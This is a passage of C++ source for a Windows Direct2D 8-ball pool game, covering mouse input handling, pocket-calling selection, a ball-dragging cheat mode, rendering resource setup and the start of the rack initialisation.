                    break;
                } // End switch(wParam) for player controls
                return 0; // Indicate player control key was processed
            } // End if(canPlayerControl)
        } // End scope for WM_KEYDOWN case
        // If key wasn't F1/F2 and player couldn't control, maybe allow default processing?
        // return DefWindowProc(hwnd, msg, wParam, lParam); // Or just return 0
        return 0;

        case WM_MOUSEMOVE: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- NEW LOGIC: Handle Pocket Hover ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {
                int oldHover = currentlyHoveredPocket;
                currentlyHoveredPocket = -1; // Reset
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        currentlyHoveredPocket = i;
                        break;
                    }
                }
                if (oldHover != currentlyHoveredPocket) {
                    InvalidateRect(hwnd, NULL, FALSE);
                }
                // Do NOT return 0 here, allow normal mouse angle update to continue
            }
            // --- END NEW LOGIC ---


            cueBall = GetCueBall(); // Declare and get cueBall pointer

            if (isDraggingCueBall && cheatModeEnabled && draggingBallId != -1) {
                Ball* ball = GetBallById(draggingBallId);
                if (ball) {
                    ball->x = (float)ptMouse.x;
                    ball->y = (float)ptMouse.y;
                    ball->vx = ball->vy = 0.0f;
                }
                return 0;
            }

            if (!cueBall) return 0;

            // Update Aiming Logic (Check player turn)
            if (isDraggingCueBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (!isPlayer2AI && currentPlayer == 2 && currentGameState == BALL_IN_HAND_P2) ||
                    currentGameState == PRE_BREAK_PLACEMENT))
            {
                bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                // Tentative position update
                cueBall->x = (float)ptMouse.x;
                cueBall->y = (float)ptMouse.y;
                cueBall->vx = cueBall->vy = 0;
            }
            else if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                //NEW2 MOUSEBOUND CODE = START
                    /*// Clamp mouse inside table bounds during aiming
                    if (ptMouse.x < TABLE_LEFT) ptMouse.x = TABLE_LEFT;
                if (ptMouse.x > TABLE_RIGHT) ptMouse.x = TABLE_RIGHT;
                if (ptMouse.y < TABLE_TOP) ptMouse.y = TABLE_TOP;
                if (ptMouse.y > TABLE_BOTTOM) ptMouse.y = TABLE_BOTTOM;*/
                //NEW2 MOUSEBOUND CODE = END
                // Aiming drag updates angle and power
                float dx = (float)ptMouse.x - cueBall->x;
                float dy = (float)ptMouse.y - cueBall->y;
                if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                //float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                //shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                if (!keyboardAimingActive) { // Only update shotPower if NOT keyboard aiming
                    float pullDist = GetDistance((float)ptMouse.x, (float)ptMouse.y, aimStartPoint.x, aimStartPoint.y);
                    shotPower = std::min(pullDist / 10.0f, MAX_SHOT_POWER);
                }
            }
            else if (isSettingEnglish &&
                ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == PLAYER2_TURN || currentGameState == AIMING || currentGameState == BREAKING))))
            {
                // Setting English
                float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                float dist = GetDistance(dx, dy, 0, 0);
                if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                cueSpinX = dx / spinIndicatorRadius;
                cueSpinY = dy / spinIndicatorRadius;
            }
            else {
                //DISABLE PERM AIMING = START
                /*// Update visual angle even when not aiming/dragging (Check player turn)
                bool canUpdateVisualAngle = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BALL_IN_HAND_P1)) ||
                    (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BALL_IN_HAND_P2)) ||
                    currentGameState == PRE_BREAK_PLACEMENT || currentGameState == BREAKING || currentGameState == AIMING);

                if (canUpdateVisualAngle && !isDraggingCueBall && !isAiming && !isDraggingStick && !keyboardAimingActive) // NEW: Prevent mouse override if keyboard aiming
                {
                    // NEW MOUSEBOUND CODE = START
                        // Only update cue angle if mouse is inside the playable table area
                    if (ptMouse.x >= TABLE_LEFT && ptMouse.x <= TABLE_RIGHT &&
                        ptMouse.y >= TABLE_TOP && ptMouse.y <= TABLE_BOTTOM)
                    {
                        // NEW MOUSEBOUND CODE = END
                        Ball* cb = cueBall; // Use function-scope cueBall // Already got cueBall above
                        if (cb) {
                            float dx = (float)ptMouse.x - cb->x;
                            float dy = (float)ptMouse.y - cb->y;
                            if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                        }
                    } //NEW MOUSEBOUND CODE LINE = DISABLE
                }*/
                //DISABLE PERM AIMING = END
            }
            return 0;
        } // End WM_MOUSEMOVE

        case WM_LBUTTONDOWN: {
            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            // --- FOOLPROOF FIX: This block implements the two-stage pocket selection ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // STAGE 1, STEP 1: Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // STAGE 1, STEP 2: Player clicked on a pocket. Update the choice.
                    // We DO NOT change the game state here. This allows re-selection.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and stay in CHOOSING_POCKET state.
                }

                // STAGE 2, STEP 1: Check if the player is clicking the cue ball to confirm.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // STAGE 2, STEP 2: A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to a generic aiming state.
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message.
                    isAiming = true; // Prepare for aiming.
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable.
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }

            /*// --- FOOLPROOF FIX: This block handles re-selectable pocket choice ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) { // Player clicked on a pocket
                    // FIX: Update the called pocket, but DO NOT change the game state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show updated arrow
                    return 0; // Consume the click and stay in CHOOSING_POCKET state
                }

                // FIX: Add new logic to CONFIRM the choice by clicking the cue ball.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = AIMING; // Go to aiming, not PLAYER1_TURN
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }*/

            /*// --- handle pocket re-selection when choosing 8-ball pocket ---
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1)
                || (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI))
            {
                POINT pt = { LOWORD(lParam), HIWORD(lParam) };
                for (int i = 0; i < 6; ++i) {
                    float dx = pt.x - pocketPositions[i].x;
                    float dy = pt.y - pocketPositions[i].y;
                    if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                        // 1) Record the call
                        if (currentPlayer == 1) calledPocketP1 = i;
                        else                  calledPocketP2 = i;
                        // 2) Clear any prompt text
                        pocketCallMessage.clear();
                        // 3) Return to normal aiming state
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        // 4) Redraw (arrow stays because calledPocketP* >= 0)
                        InvalidateRect(hwnd, NULL, FALSE);
                        return 0; // consume click
                    }
                }
                return 0; // clicked outside ? stay in pocket?call until a valid pocket is chosen
            }*/

            // … rest of your click?to?aim logic …

            //replaced /w new code
            /*
            // --- FIX: Add this entire block at the top of WM_LBUTTONDOWN ---
    // This handles input specifically for the pocket selection state.
            if ((currentGameState == CHOOSING_POCKET_P1 && currentPlayer == 1) ||
                (currentGameState == CHOOSING_POCKET_P2 && currentPlayer == 2 && !isPlayer2AI)) {

                int clickedPocketIndex = -1;
                // Check if the click was on any of the 6 pockets
                for (int i = 0; i < 6; ++i) {
                    if (GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, pocketPositions[i].x, pocketPositions[i].y) < HOLE_VISUAL_RADIUS * HOLE_VISUAL_RADIUS * 2.25f) {
                        clickedPocketIndex = i;
                        break;
                    }
                }

                if (clickedPocketIndex != -1) {
                    // A pocket was clicked. Update the selection but STAY in the choosing state.
                    // This allows the player to click another pocket to change their mind.
                    if (currentPlayer == 1) calledPocketP1 = clickedPocketIndex;
                    else calledPocketP2 = clickedPocketIndex;
                    InvalidateRect(hwnd, NULL, FALSE); // Redraw to show the arrow has moved.
                    return 0; // Consume the click and wait for the next action.
                }

                // If the player clicks the CUE BALL, that confirms their pocket selection.
                Ball* cueBall = GetCueBall();
                int calledPocket = (currentPlayer == 1) ? calledPocketP1 : calledPocketP2;
                if (cueBall && calledPocket != -1 && GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y) < BALL_RADIUS * BALL_RADIUS * 25) {
                    // A pocket has been selected, and the player now clicks the cue ball.
                    // NOW we transition to the normal aiming state.
                    currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                    pocketCallMessage = L""""; // Clear the ""Choose a pocket..."" message
                    isAiming = true; // Prepare for aiming
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y); // Use your existing aim start variable
                    return 0;
                }

                // If they click anywhere else (not a pocket, not the cue ball), do nothing.
                return 0;
            }
            // --- END OF THE NEW BLOCK ---
            */
            //new code ends here

            if (cheatModeEnabled) {
                // Allow dragging any ball freely
                for (Ball& ball : balls) {
                    float distSq = GetDistanceSq(ball.x, ball.y, (float)ptMouse.x, (float)ptMouse.y);
                    if (distSq <= BALL_RADIUS * BALL_RADIUS * 4) { // Click near ball
                        isDraggingCueBall = true;
                        draggingBallId = ball.id;
                        if (ball.id == 0) {
                            // If dragging cue ball manually, ensure we stay in Ball-In-Hand state
                            if (currentPlayer == 1)
                                currentGameState = BALL_IN_HAND_P1;
                            else if (currentPlayer == 2 && !isPlayer2AI)
                                currentGameState = BALL_IN_HAND_P2;
                        }
                        return 0;
                    }
                }
            }

            Ball* cueBall = GetCueBall(); // Declare and get cueBall pointer            

            // Check which player is allowed to interact via mouse click
            bool canPlayerClickInteract = ((currentPlayer == 1) || (currentPlayer == 2 && !isPlayer2AI));
            // Define states where interaction is generally allowed
            bool canInteractState = (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN ||
                currentGameState == AIMING || currentGameState == BREAKING ||
                currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 ||
                currentGameState == PRE_BREAK_PLACEMENT);

            // Check Spin Indicator first (Allow if player's turn/aim phase)
            if (canPlayerClickInteract && canInteractState) {
                float spinDistSq = GetDistanceSq((float)ptMouse.x, (float)ptMouse.y, spinIndicatorCenter.x, spinIndicatorCenter.y);
                if (spinDistSq < spinIndicatorRadius * spinIndicatorRadius * 1.2f) {
                    isSettingEnglish = true;
                    float dx = (float)ptMouse.x - spinIndicatorCenter.x;
                    float dy = (float)ptMouse.y - spinIndicatorCenter.y;
                    float dist = GetDistance(dx, dy, 0, 0);
                    if (dist > spinIndicatorRadius) { dx *= spinIndicatorRadius / dist; dy *= spinIndicatorRadius / dist; }
                    cueSpinX = dx / spinIndicatorRadius;
                    cueSpinY = dy / spinIndicatorRadius;
                    isAiming = false; isDraggingStick = false; isDraggingCueBall = false;
                    return 0;
                }
            }

            if (!cueBall) return 0;

            // Check Ball-in-Hand placement/drag
            bool isPlacingBall = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
            bool isPlayerAllowedToPlace = (isPlacingBall &&
                ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                    (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                    (currentGameState == PRE_BREAK_PLACEMENT))); // Allow current player in break setup

            if (isPlayerAllowedToPlace) {
                float distSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                if (distSq < BALL_RADIUS * BALL_RADIUS * 9.0f) {
                    isDraggingCueBall = true;
                    isAiming = false; isDraggingStick = false;
                }
                else {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition((float)ptMouse.x, (float)ptMouse.y, behindHeadstring)) {
                        cueBall->x = (float)ptMouse.x; cueBall->y = (float)ptMouse.y;
                        cueBall->vx = 0; cueBall->vy = 0;
                        isDraggingCueBall = false;
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                    }
                }
                return 0;
            }

            // Check for starting Aim (Cue Ball OR Stick)
            bool canAim = ((currentPlayer == 1 && (currentGameState == PLAYER1_TURN || currentGameState == BREAKING)) ||
                (currentPlayer == 2 && !isPlayer2AI && (currentGameState == PLAYER2_TURN || currentGameState == BREAKING)));

            if (canAim) {
                const float stickDrawLength = 150.0f * 1.4f;
                float currentStickAngle = cueAngle + PI;
                D2D1_POINT_2F currentStickEnd = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * stickDrawLength, cueBall->y + sinf(currentStickAngle) * stickDrawLength);
                D2D1_POINT_2F currentStickTip = D2D1::Point2F(cueBall->x + cosf(currentStickAngle) * 5.0f, cueBall->y + sinf(currentStickAngle) * 5.0f);
                float distToStickSq = PointToLineSegmentDistanceSq(D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y), currentStickTip, currentStickEnd);
                float stickClickThresholdSq = 36.0f;
                float distToCueBallSq = GetDistanceSq(cueBall->x, cueBall->y, (float)ptMouse.x, (float)ptMouse.y);
                float cueBallClickRadiusSq = BALL_RADIUS * BALL_RADIUS * 25;

                bool clickedStick = (distToStickSq < stickClickThresholdSq);
                bool clickedCueArea = (distToCueBallSq < cueBallClickRadiusSq);

                if (clickedStick || clickedCueArea) {
                    isDraggingStick = clickedStick && !clickedCueArea;
                    isAiming = clickedCueArea;
                    aimStartPoint = D2D1::Point2F((float)ptMouse.x, (float)ptMouse.y);
                    shotPower = 0;
                    float dx = (float)ptMouse.x - cueBall->x;
                    float dy = (float)ptMouse.y - cueBall->y;
                    if (dx != 0 || dy != 0) cueAngle = atan2f(dy, dx);
                    if (currentGameState != BREAKING) currentGameState = AIMING;
                }
            }
            return 0;
        } // End WM_LBUTTONDOWN


        case WM_LBUTTONUP: {
            // --- FOOLPROOF FIX for Cheat Mode Scoring ---
            if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- This is the new, ""smarter"" logic ---
                            b->isPocketed = true; // Pocket the ball visually.

                            // If the table is open, assign types based on this cheated ball.
                            if (player1Info.assignedType == BallType::NONE && b->id != 0 && b->id != 8) {
                                AssignPlayerBallTypes(b->type, false);
                            }

                            // Now, correctly update the score for the right player.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            break; // Stop checking pockets.
                        }
                    }
                }
            }

            /*if (cheatModeEnabled && draggingBallId != -1) {
                Ball* b = GetBallById(draggingBallId);
                if (b) {
                    for (int p = 0; p < 6; ++p) {
                        float dx = b->x - pocketPositions[p].x;
                        float dy = b->y - pocketPositions[p].y;
                        if (dx * dx + dy * dy <= POCKET_RADIUS * POCKET_RADIUS) {
                            // --- Assign ball type on first cheat-pocket if table still open ---
                            if (player1Info.assignedType == BallType::NONE
                                && player2Info.assignedType == BallType::NONE
                                && (b->type == BallType::SOLID || b->type == BallType::STRIPE))
                            {
                                // In cheat mode, let's just assign to the current player
                                AssignPlayerBallTypes(b->type);
                            }
                            b->isPocketed = true;
                            pocketedThisTurn.push_back(b->id);

                            // --- FIX FOR CHEAT MODE SCORING ---
                            // Immediately increment the correct player's count based on ball type,
                            // not whose turn it is.
                            if (b->id != 0 && b->id != 8) {
                                if (b->type == player1Info.assignedType) {
                                    player1Info.ballsPocketedCount++;
                                }
                                else if (b->type == player2Info.assignedType) {
                                    player2Info.ballsPocketedCount++;
                                }
                            }
                            // --- END FIX ---
                            // --- NEW: If this was the 7th ball, trigger the arrow call UI ---
                            if (b->id != 8) {
                                PlayerInfo& shooter = (currentPlayer == 1 ? player1Info : player2Info);
                                if (shooter.ballsPocketedCount >= 7
                                    && calledPocketP1 < 0
                                    && calledPocketP2 < 0)
                                {
                                    currentGameState = (currentPlayer == 1)
                                        ? CHOOSING_POCKET_P1
                                        : CHOOSING_POCKET_P2;
                                }
                                else {
                                    // For any other cheat?pocket, keep the turn so you can continue aiming
                                    currentGameState = (currentPlayer == 1)
                                        ? PLAYER1_TURN
                                        : PLAYER2_TURN;
                                }
                            }
                            // --- NEW: If it was the 8-Ball, award instant victory ---
                            else {
                                currentGameState = GAME_OVER;
                                gameOverMessage = (currentPlayer == 1 ? player1Info.name : player2Info.name)
                                    + std::wstring(L"" Wins!"");
                            }
                            break;
                        }
                    }
                }
            }*/

            ptMouse.x = LOWORD(lParam);
            ptMouse.y = HIWORD(lParam);

            Ball* cueBall = GetCueBall(); // Get cueBall pointer

            // Check for releasing aim drag (Stick OR Cue Ball)
            if ((isAiming || isDraggingStick) &&
                ((currentPlayer == 1 && (currentGameState == AIMING || currentGameState == BREAKING)) ||
                    (!isPlayer2AI && currentPlayer == 2 && (currentGameState == AIMING || currentGameState == BREAKING))))
            {
                bool wasAiming = isAiming;
                bool wasDraggingStick = isDraggingStick;
                isAiming = false; isDraggingStick = false;

                if (shotPower > 0.15f) { // Check power threshold
                    if (currentGameState != AI_THINKING) {
                        firstHitBallIdThisShot = -1; cueHitObjectBallThisShot = false; railHitAfterContact = false; // Reset foul flags
                        std::thread([](const TCHAR* soundName) { PlaySound(soundName, NULL, SND_FILENAME | SND_NODEFAULT); }, TEXT(""cue.wav"")).detach();
                        ApplyShot(shotPower, cueAngle, cueSpinX, cueSpinY);
                        currentGameState = SHOT_IN_PROGRESS;
                        foulCommitted = false; pocketedThisTurn.clear();
                    }
                }
                else if (currentGameState != AI_THINKING) { // Revert state if power too low
                    if (currentGameState == BREAKING) { /* Still breaking */ }
                    else {
                        currentGameState = (currentPlayer == 1) ? PLAYER1_TURN : PLAYER2_TURN;
                        if (currentPlayer == 2 && isPlayer2AI) aiTurnPending = false;
                    }
                }
                shotPower = 0; // Reset power indicator regardless
            }

            // Handle releasing cue ball drag (placement)
            if (isDraggingCueBall) {
                isDraggingCueBall = false;
                // Check player allowed to place
                bool isPlacingState = (currentGameState == BALL_IN_HAND_P1 || currentGameState == BALL_IN_HAND_P2 || currentGameState == PRE_BREAK_PLACEMENT);
                bool isPlayerAllowed = (isPlacingState &&
                    ((currentPlayer == 1 && currentGameState == BALL_IN_HAND_P1) ||
                        (currentPlayer == 2 && !isPlayer2AI && currentGameState == BALL_IN_HAND_P2) ||
                        (currentGameState == PRE_BREAK_PLACEMENT)));

                if (isPlayerAllowed && cueBall) {
                    bool behindHeadstring = (currentGameState == PRE_BREAK_PLACEMENT);
                    if (IsValidCueBallPosition(cueBall->x, cueBall->y, behindHeadstring)) {
                        // Finalize position already set by mouse move
                        // Transition state
                        if (currentGameState == PRE_BREAK_PLACEMENT) currentGameState = BREAKING;
                        else if (currentGameState == BALL_IN_HAND_P1) currentGameState = PLAYER1_TURN;
                        else if (currentGameState == BALL_IN_HAND_P2) currentGameState = PLAYER2_TURN;
                        cueAngle = 0.0f;
                        /* ----------------------------------------------------
                        If the player who now has the turn is already on the
                        8-ball, immediately switch to pocket-selection state.
                        ---------------------------------------------------- */
                        if (currentGameState == PLAYER1_TURN || currentGameState == PLAYER2_TURN)
                        {
                            CheckAndTransitionToPocketChoice(currentPlayer);
                        }
                    }
                    else { /* Stay in BALL_IN_HAND state if final pos invalid */ }
                }
            }

            // Handle releasing english setting
            if (isSettingEnglish) {
                isSettingEnglish = false;
            }
            return 0;
        } // End WM_LBUTTONUP

        case WM_DESTROY:
            isMusicPlaying = false;
            if (midiDeviceID != 0) {
                mciSendCommand(midiDeviceID, MCI_CLOSE, 0, NULL);
                midiDeviceID = 0;
                SaveSettings(); // Save settings on exit
            }
            PostQuitMessage(0);
            return 0;

        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
        }
        return 0;
    }

    // --- Direct2D Resource Management ---

    HRESULT CreateDeviceResources() {
        HRESULT hr = S_OK;

        // Create Direct2D Factory
        if (!pFactory) {
            hr = D2D1CreateFactory(D2D1_FACTORY_TYPE_SINGLE_THREADED, &pFactory);
            if (FAILED(hr)) return hr;
        }

        // Create DirectWrite Factory
        if (!pDWriteFactory) {
            hr = DWriteCreateFactory(
                DWRITE_FACTORY_TYPE_SHARED,
                __uuidof(IDWriteFactory),
                reinterpret_cast<IUnknown**>(&pDWriteFactory)
            );
            if (FAILED(hr)) return hr;
        }

        // Create Text Formats
        if (!pTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Segoe UI"", NULL, DWRITE_FONT_WEIGHT_NORMAL, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                16.0f, L""en-us"", &pTextFormat
            );
            if (FAILED(hr)) return hr;
            // Center align text
            pTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_CENTER);
            pTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }
        if (!pLargeTextFormat && pDWriteFactory) {
            hr = pDWriteFactory->CreateTextFormat(
                L""Impact"", NULL, DWRITE_FONT_WEIGHT_BOLD, DWRITE_FONT_STYLE_NORMAL, DWRITE_FONT_STRETCH_NORMAL,
                48.0f, L""en-us"", &pLargeTextFormat
            );
            if (FAILED(hr)) return hr;
            pLargeTextFormat->SetTextAlignment(DWRITE_TEXT_ALIGNMENT_LEADING); // Align left
            pLargeTextFormat->SetParagraphAlignment(DWRITE_PARAGRAPH_ALIGNMENT_CENTER);
        }


        // Create Render Target (needs valid hwnd)
        if (!pRenderTarget && hwndMain) {
            RECT rc;
            GetClientRect(hwndMain, &rc);
            D2D1_SIZE_U size = D2D1::SizeU(rc.right - rc.left, rc.bottom - rc.top);

            hr = pFactory->CreateHwndRenderTarget(
                D2D1::RenderTargetProperties(),
                D2D1::HwndRenderTargetProperties(hwndMain, size),
                &pRenderTarget
            );
            if (FAILED(hr)) {
                // If failed, release factories if they were created in this call
                SafeRelease(&pTextFormat);
                SafeRelease(&pLargeTextFormat);
                SafeRelease(&pDWriteFactory);
                SafeRelease(&pFactory);
                pRenderTarget = nullptr; // Ensure it's null on failure
                return hr;
            }
        }

        return hr;
    }

    void DiscardDeviceResources() {
        SafeRelease(&pRenderTarget);
        SafeRelease(&pTextFormat);
        SafeRelease(&pLargeTextFormat);
        SafeRelease(&pDWriteFactory);
        // Keep pFactory until application exit? Or release here too? Let's release.
        SafeRelease(&pFactory);
    }

    void OnResize(UINT width, UINT height) {
        if (pRenderTarget) {
            D2D1_SIZE_U size = D2D1::SizeU(width, height);
            pRenderTarget->Resize(size); // Ignore HRESULT for simplicity here
        }
    }

    // --- Game Initialization ---
    void InitGame() {
        srand((unsigned int)time(NULL)); // Seed random number generator
        isOpeningBreakShot = true; // This is the start of a new game, so the next shot is an opening break.
        aiPlannedShotDetails.isValid = false; // Reset AI planned shot
        aiIsDisplayingAim = false;
        aiAimDisplayFramesLeft = 0;
        // ... (rest of InitGame())

        // --- Ensure pocketed list is clear from the absolute start ---
        pocketedThisTurn.clear();

        balls.clear(); // Clear existing balls

        // Reset Player Info (Names should be set by Dialog/wWinMain/ResetGame)
        player1Info.assignedType = BallType::NONE;
        player1Info.ballsPocketedCount = 0;
        // Player 1 Name usually remains ""Player 1""
        player2Info.assignedType = BallType::NONE;
        player2Info.ballsPocketedCount = 0;
        // Player 2 Name is set based on gameMode in ShowNewGameDialog
            // --- Reset any 8?Ball call state on new game ---
        lastEightBallPocketIndex = -1;
        calledPocketP1 = -1;
        calledPocketP2 = -1;
        pocketCallMessage = L"""";
        aiPlannedShotDetails.isValid = false; // THIS IS THE CRITICAL FIX: Reset the AI's plan.

        // Create Cue Ball (ID 0)
        // Initial position will be set during PRE_BREAK_PLACEMENT state
        balls.push_back({ 0, BallType::CUE_BALL, TABLE_LEFT + TABLE_WIDTH * 0.15f, RACK_POS_Y, 0, 0, CUE_BALL_COLOR, false });

        // --- Create Object Balls (Temporary List) ---
        std::vector<Ball> objectBalls;
        // Solids (1-7, Yellow)
        for (int i = 1; i <= 7; ++i) {
            objectBalls.push_back({ i, BallType::SOLID, 0, 0, 0, 0, SOLID_COLOR, false });
        }
        // Stripes (9-15, Red)
        for (int i = 9; i <= 15; ++i) {
            objectBalls.push_back({ i, BallType::STRIPE, 0, 0, 0, 0, STRIPE_COLOR, false });
        }
        // 8-Ball (ID 8) - Add it to the list to be placed
        objectBalls.push_back({ 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false });


        // --- Racking Logic (Improved) ---
        float spacingX = BALL_RADIUS * 2.0f * 0.866f; // cos(30) for horizontal spacing
        float spacingY = BALL_RADIUS * 2.0f * 1.0f;   // Vertical spacing

        // Define rack positions (0-14 indices corresponding to triangle spots)
        D2D1_POINT_2F rackPositions[15];
        int rackIndex = 0;
        for (int row = 0; row < 5; ++row) {
            for (int col = 0; col <= row; ++col) {
                if (rackIndex >= 15) break;
                float x = RACK_POS_X + row * spacingX;
                float y = RACK_POS_Y + (col - row / 2.0f) * spacingY;
                rackPositions[rackIndex++] = D2D1::Point2F(x, y);
            }
        }

        // Separate 8-ball
        Ball eightBall;
        std::vector<Ball> otherBalls; // Solids and Stripes
        bool eightBallFound = false;
        for (const auto& ball : objectBalls) {
            if (ball.id == 8) {
                eightBall = ball;
                eightBallFound = true;
            }
            else {
                otherBalls.push_back(ball);
            }
        }
        // Ensure 8 ball was actually created (should always be true)
        if (!eightBallFound) {
            // Handle error - perhaps recreate it? For now, proceed.
            eightBall = { 8, BallType::EIGHT_BALL, 0, 0, 0, 0, EIGHT_BALL_COLOR, false };
        }


        // Shuffle the other 14 balls
        // Use std::shuffle if available (C++11 and later) for better randomness
        // std::random_device rd;
        // std::mt19937 g(rd());
        // std::shuffle(otherBalls.begin(), otherBalls.end(), g);
        std::random_shuffle(otherBalls.begin(), otherBalls.end()); // Using deprecated for now

        // --- Place balls into the main 'balls' vector in rack order ---
        // Important: Add the cue ball (already created) first.
        // (Cue ball added at the start of the function now)

        // 1. Place the 8-ball in its fixed position (index 4 for the 3rd row center)
        int eightBallRackIndex = 4;
